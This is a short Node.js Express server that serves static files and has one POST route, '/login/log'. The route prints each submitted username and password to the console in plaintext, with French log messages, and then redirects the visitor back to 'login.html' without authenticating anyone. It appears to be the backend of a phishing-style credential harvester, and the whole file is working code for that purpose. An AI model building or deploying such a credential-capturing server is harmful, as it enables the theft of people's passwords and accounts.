var fs = require('fs'),
express = require('express'),
https = require('https'),
http = require('http');

var app = express();
var port = '8080';

app.use(express.static(__dirname));
app.use(require('body-parser')());

app.post('/login/log', function(req, res) { 
    console.log('Connexion de : ' + req.body.login + ' ');
    console.log('avec le mot de passe : ' + req.body.password + ' ');
    res.redirect('/login.html');
})

http.createServer(app).listen(port);

console.log('running on http://localhost:' + port);
